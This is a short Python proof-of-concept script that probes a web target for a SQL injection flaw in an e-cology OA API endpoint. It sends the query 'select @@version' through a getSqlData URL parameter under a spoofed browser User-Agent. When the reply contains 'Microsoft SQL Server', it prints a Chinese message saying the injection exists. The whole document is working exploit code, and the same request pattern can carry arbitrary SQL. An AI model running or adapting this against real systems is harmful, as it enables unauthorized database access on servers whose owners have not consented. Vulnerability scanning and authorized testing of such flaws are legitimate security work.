import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version'
        req = httpx.get(url,headers=headers)
        if "Microsoft SQL Server" in req.text:
            print("\033[0;31m 存在ecology注入："+ url )
    except:
        pass


